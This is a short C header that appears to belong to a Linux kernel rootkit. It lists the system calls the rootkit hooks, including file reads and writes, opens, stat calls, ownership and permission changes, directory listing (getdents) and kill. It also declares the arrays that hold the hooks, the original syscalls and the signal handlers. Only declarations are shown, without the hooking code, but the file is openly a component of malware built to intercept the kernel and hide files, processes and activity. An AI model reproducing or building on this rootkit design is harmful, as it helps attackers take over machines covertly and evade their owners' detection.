#ifndef _ROOTKIT_SYSCALL_HOOKS_H_
#define _ROOTKIT_SYSCALL_HOOKS_H_

#include "hooking.h"
#include "macro_utils.h"
#include "utils.h"
#include <asm/unistd.h>

#define HOOKED_SYSCALLS                                                                          \
    read, pread64, write, sendfile, open, openat, openat2, creat, access, faccessat, faccessat2, \
        stat, lstat, newfstatat, statx, truncate, chdir, chroot, chmod, fchmodat, chown, lchown, \
        fchownat, getdents, getdents64, kill

#define P_SYSCALL_HOOKS p_syscall_hooks /* Variable name for the syscall hook array */
#define P_ORIG_SYSFUNS  p_orig_sysfuns  /* Variable name for the original syscall functions array */
#define P_SIG_HANDLERS  p_sig_handlers  /* Variable name for the signal handler array */

// Array of the original syscall function references.
extern sysfun_t P_ORIG_SYSFUNS[__NR_syscalls];

// Array of the syscall hooks.
extern hook_t P_SYSCALL_HOOKS[];

// Array of the signal handlers.
extern const signal_handler_t P_SIG_HANDLERS[];

DECLARE_HOOK_HANDLERS(HOOKED_SYSCALLS)

#endif
